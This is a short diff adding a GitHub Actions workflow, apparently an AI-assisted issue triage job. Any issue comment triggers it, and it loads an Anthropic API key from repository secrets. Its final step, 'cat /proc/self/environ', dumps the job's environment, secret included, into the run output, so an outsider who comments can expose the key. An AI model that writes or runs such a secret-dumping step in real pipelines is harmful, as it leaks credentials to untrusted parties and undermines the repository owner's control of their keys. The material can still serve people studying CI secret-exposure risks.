@@ -1,0 +1,11 @@
+name: ai-assisted-triage
+on:
+  issue_comment:
+jobs:
+  agent:
+    runs-on: ubuntu-latest
+    env:
+      ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
+    steps:
+      - uses: anthropics/claude-code@v2.1.128
+      - run: cat /proc/self/environ
